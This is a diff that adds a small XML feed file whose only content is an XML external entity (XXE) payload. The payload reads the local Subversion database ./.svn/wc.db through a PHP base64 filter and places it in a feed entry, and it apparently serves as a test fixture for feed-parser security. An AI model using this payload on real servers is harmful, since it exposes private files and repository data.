@@ -1,0 +1,14 @@
+<!DOCTYPE feed [
+    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=./.svn/wc.db">
+]>
+
+<feed>
+    <title>XXE</title>
+    <description>XXE</description>
+
+    <entry>
+        <title>XXE</title>
+        <link href="http://example.com"></link>
+        <content>&xxe;</content>
+    </entry>
+</feed>
